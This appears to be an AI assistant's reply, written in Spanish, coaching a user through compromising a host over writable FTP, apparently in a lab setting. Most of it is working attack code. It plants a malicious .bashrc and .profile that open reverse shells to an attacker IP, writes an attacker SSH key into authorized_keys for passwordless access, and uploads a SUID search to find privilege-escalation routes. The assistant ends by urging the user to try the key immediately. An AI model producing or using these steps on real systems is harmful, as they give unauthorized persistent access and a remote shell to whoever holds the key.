## 🎯 ¡Sí! Podés subir, pisar y modificar archivos vía FTP

Si tenés permisos de escritura en `/home/surreta/` (y parece que sí), podés:

---

## 📤 1. Subir tu propio `bashrc` o script

```bash
# Crear un .bashrc malicioso en attacker-3
cat > .bashrc_malicious << 'EOF'
# Comando que se ejecuta al hacer login
bash -i >& /dev/tcp/10.10.0.203/4444 0>&1 &
EOF

# Subirlo por FTP
ftp surreta@10.0.3.5
ftp> put .bashrc_malicious .bashrc
ftp> bye
```

---

## 💀 2. Modificar `.profile` (se ejecuta al login)

```bash
# Crear .profile malicioso
cat > .profile << 'EOF'
# Reverse shell al hacer login
nohup bash -c "bash -i >& /dev/tcp/10.10.0.203/4444 0>&1" &
EOF

# Subir
ftp surreta@10.0.3.5
ftp> put .profile
ftp> bye
```

---

## 🔄 3. Forzar ejecución (reinicio de servicio o login de surreta)

**Problema:** `surreta` no puede hacer login porque su shell es `/usr/sbin/nologin`.

**Pero:** Si algún script o servicio ejecuta comandos como `surreta` (ej: cron, systemd), tu `.bashrc` se ejecutará.

---

## 🚀 4. Mejor opción: Subir script y buscar SUID

```bash
# Crear script para buscar SUID
cat > find_suid.sh << 'EOF'
#!/bin/bash
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_results.txt
EOF

# Subir y ejecutar
ftp surreta@10.0.3.5
ftp> put find_suid.sh
ftp> chmod 755 find_suid.sh
ftp> bye

# Ejecutar via SSH
ssh surreta@10.0.3.5 "/home/surreta/find_suid.sh"

# Leer resultados
ssh surreta@10.0.3.5 "cat /tmp/suid_results.txt"
```

---

## 💣 5. La más peligrosa: Modificar `.ssh/authorized_keys`

Si `surreta` tiene carpeta `.ssh` y podemos escribir:

```bash
# Generar clave SSH en attacker-3
ssh-keygen -t rsa -b 4096 -f ~/.ssh/surreta_key -N ""

# Subir clave pública
ftp surreta@10.0.3.5
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put ~/.ssh/surreta_key.pub authorized_keys
ftp> bye

# Ahora conectarse como surreta SIN contraseña
ssh -i ~/.ssh/surreta_key surreta@10.0.3.5
```

**¡Esto podría darte shell interactivo si el problema es solo la contraseña!**

---

## 🔥 6. Probar si la clave pública funciona

```bash
# Intentar conectar
ssh -i ~/.ssh/surreta_key surreta@10.0.3.5

# Si dice "This account is currently not available" → mismo problema
# Si te da shell → ¡ganaste!
```

---

## 📋 Resumen de lo que podés hacer AHORA

| Acción | Comando | Objetivo |
|--------|---------|----------|
| Subir `.bashrc` | `put .bashrc_malicioso .bashrc` | Reverse shell al login |
| Subir `.profile` | `put .profile` | Reverse shell al login |
| Subir clave SSH | `put key.pub .ssh/authorized_keys` | Acceso sin contraseña |
| Subir script SUID | `put find_suid.sh` | Encontrar vectores de escalada |
| Modificar `mail` | `put mail` | ¿Alguien lee ese archivo? |

---

## 🎯 Acción inmediata

**Probá la clave SSH primero (es lo más rápido):**

```bash
# 1. Generar clave
ssh-keygen -t rsa -b 4096 -f ~/.ssh/surreta_key -N ""

# 2. Subir clave pública vía FTP
ftp surreta@10.0.3.5
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put ~/.ssh/surreta_key.pub authorized_keys
ftp> bye

# 3. Intentar conectar
ssh -i ~/.ssh/surreta_key surreta@10.0.3.5
```

**¿Qué te devuelve el intento de conexión?** ¿Sigue diciendo "This account is currently not available"?